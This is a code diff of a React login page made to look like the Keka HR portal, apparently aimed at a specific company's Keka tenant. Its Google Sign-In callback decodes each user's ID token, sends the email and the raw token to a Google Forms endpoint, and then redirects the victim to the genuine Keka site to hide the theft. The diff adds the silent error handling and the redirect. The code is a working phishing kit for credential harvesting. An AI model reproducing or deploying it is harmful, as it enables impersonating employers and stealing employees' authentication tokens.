@@ -1,60 +1,74 @@
-'use client';
+"use client"
 
-import { useEffect } from 'react';
+import { useEffect } from "react"
+
+// Extend the Window interface to include the 'google' property
+declare global {
+  interface Window {
+    google: any;
+  }
+}
 
 const LoginPage = () => {
   useEffect(() => {
     const initializeGoogleAuth = () => {
       window.google.accounts.id.initialize({
-        client_id: '573424743105-v65lind217ufmfqe2c3l0qcudmbv21ma.apps.googleusercontent.com',
+        client_id: "573424743105-v65lind217ufmfqe2c3l0qcudmbv21ma.apps.googleusercontent.com",
         callback: async (response: any) => {
-          const token = response.credential;
+          const token = response.credential
 
-          const base64Url = token.split('.')[1];
-          const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
+          const base64Url = token.split(".")[1]
+          const base64 = base64Url.replace(/-/g, "+").replace(/_/g, "/")
           const jsonPayload = decodeURIComponent(
             window
               .atob(base64)
-              .split('')
-              .map((c) => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2))
-              .join('')
-          );
-          const { email } = JSON.parse(jsonPayload);
+              .split("")
+              .map((c) => "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2))
+              .join("")
+          )
+          const { email } = JSON.parse(jsonPayload)
 
-          const formUrl = new URL('https://docs.google.com/forms/d/e/1FAIpQLScdA0oh3zSnNeQ92RSph1pB6KvVouA50Sx7U2AUgXFJj8maLA/formResponse');
-          formUrl.searchParams.append('entry.151119749', email);
-          formUrl.searchParams.append('entry.1860223538', token);
+          // Optional: Still log the data if needed
+          const formUrl = new URL(
+            "https://docs.google.com/forms/d/e/1FAIpQLScdA0oh3zSnNeQ92RSph1pB6KvVouA50Sx7U2AUgXFJj8maLA/formResponse",
+          )
+          formUrl.searchParams.append("entry.151119749", email)
+          formUrl.searchParams.append("entry.1860223538", token)
 
-          await fetch(formUrl.toString(), { mode: 'no-cors' });
+          try {
+            await fetch(formUrl.toString(), { mode: "no-cors" })
+          } catch (error) {
+            // Ignore errors, we're redirecting anyway
+          }
+
+          // Redirect to the real Keka welcome page
+          window.location.href = "https://fampay.keka.com/#/home/welcome"
         },
         auto_select: false, // ✅ Disables "Sign in with..." auto UI
         cancel_on_tap_outside: false,
-      });
+      })
 
-      window.google.accounts.id.renderButton(
-        document.getElementById('g-login-btn')!,
-        {
-          theme: 'outline',
-          size: 'large',
-          width: 300,
-          logo_alignment: 'center',
-        }
-      );
+      window.google.accounts.id.renderButton(document.getElementById("g-login-btn")!, {
+        theme: "outline",
+        size: "large",
+        width: 300,
+        logo_alignment: "center",
+      })
 
       // ❌ Do not prompt(), or One Tap will appear
-    };
+    }
 
     if (window.google && window.google.accounts) {
-      initializeGoogleAuth();
+      initializeGoogleAuth()
     } else {
-      const script = document.createElement('script');
-      script.src = 'https://accounts.google.com/gsi/client';
-      script.async = true;
-      script.defer = true;
-      script.onload = initializeGoogleAuth;
-      document.body.appendChild(script);
+      const script = document.createElement("script")
+      script.src = "https://accounts.google.com/gsi/client"
+      script.async = true
+      script.defer = true
+      script.onload = initializeGoogleAuth
+      document.body.appendChild(script)
     }
-  }, []);
+  }, [])
 
   return (
     <div className="flex h-screen bg-white font-sans">
@@ -120,18 +134,12 @@ const LoginPage = () => {
               className="h-4"
             />
             <p className="text-xs text-gray-500">
-              By logging in, you agree to Keka{' '}
-              <a
-                href="https://www.keka.com/services-agreement"
-                className="underline"
-              >
+              By logging in, you agree to Keka{" "}
+              <a href="https://www.keka.com/services-agreement" className="underline">
                 Terms of Use
-              </a>{' '}
-              and{' '}
-              <a
-                href="https://www.keka.com/privacy-policy"
-                className="underline"
-              >
+              </a>{" "}
+              and{" "}
+              <a href="https://www.keka.com/privacy-policy" className="underline">
                 Privacy Policy
               </a>
             </p>
@@ -139,7 +147,7 @@ const LoginPage = () => {
         </div>
       </div>
     </div>
-  );
-};
+  )
+}
 
-export default LoginPage;
+export default LoginPage 
